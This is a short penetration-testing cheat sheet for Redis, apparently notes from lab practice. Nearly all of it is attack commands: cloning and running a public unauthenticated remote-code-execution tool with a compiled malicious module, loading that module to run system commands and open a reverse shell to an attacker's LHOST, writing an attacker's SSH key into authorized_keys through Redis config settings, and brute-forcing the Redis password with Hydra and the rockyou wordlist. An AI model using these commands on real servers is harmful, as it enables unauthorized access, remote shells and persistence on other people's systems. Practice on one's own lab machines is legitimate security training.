# Redis

- Authenticate Redis
```
redis-cli -h 192.168.181.69 -p 6379
```

- Configuration File Default Location (`requirepass`)
```
/etc/redis/redis.conf
```


## Redis 4.x / 5.x - Unauthenticated Code Execution [linux/redis/redis_replication_cmd_exec]

```
git clone https://github.com/Ridter/redis-rce
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
python3 redis-rce.py -r <remote-ip> -p <port> -L <local-ip> -f ../RedisModules-ExecuteCommand/module.so
```

## Load Module
```
MODULE LOAD /path/to/module.so
system.exec "whoami"
system.rev LHOST LPORT
```
[HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)

## [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server.git)
[HINT](http://baihaiou.cn/2022/12/05/pg-readys/)

## Write to File
```
cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
```


## Hydra
```
hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.176.166
```
